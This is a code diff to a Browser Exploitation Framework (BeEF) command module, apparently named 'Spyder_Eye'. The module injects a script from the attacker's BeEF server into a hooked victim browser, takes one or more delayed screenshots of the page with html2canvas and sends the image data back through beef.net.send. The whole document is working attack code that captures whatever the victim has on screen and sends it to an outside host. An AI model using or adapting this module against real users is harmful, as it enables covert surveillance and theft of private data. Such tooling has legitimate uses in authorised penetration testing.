@@ -6,17 +6,40 @@
 
 beef.execute(function() {
 
-	var script = document.createElement( 'script' );
-	script.type = 'text/javascript';
-	script.src = beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/html2canvas.js';
-	$j("body").append( script );
+	var takes = parseInt('<%= @repeat %>', 10) || 1;
+	var delay = parseInt('<%= @delay %>', 10) || 0;
 
-	html2canvas(document.body, {
-		onrendered: function(canvas) {
-			var img = canvas.toDataURL("image/png");
-			beef.net.send("<%= @command_url %>", <%= @command_id %>, "image="+img);
-			//beef.net.send("<%= @command_url %>", <%= @command_id %>, "image=All done");
+	snap = function() {
+		try {
+			html2canvas(document.body).then(function(canvas) {
+	    		var d = canvas.toDataURL('image/png');
+	    		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'image=' + d );
+	    	});
+
+	    	beef.debug('[Spyder_Eye] html2canvas hasn\'t failed, that\'s something');
+	    }
+	    catch (e) {
+	    	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Obtaining snapshot failed: ' + e.message);
+	    }
+	};
+
+	takeit = function() {
+		for(var i = 0; i < takes; i++) {
+			beef.debug('[Spyder_Eye] Taking ' + i + '. snapshot');
+			setTimeout(snap, delay * i);
 		}
-	});
+	};
+
+	if (typeof html2canvas == "undefined") {		
+		var script = document.createElement('script');
+		script.type = 'text/javascript';
+		script.src = beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/h2c.js';
+		$j("body").append(script);
+
+	    setTimeout(takeit, 400);
+	}
+	else {
+		takeit();
+	}
 
 });
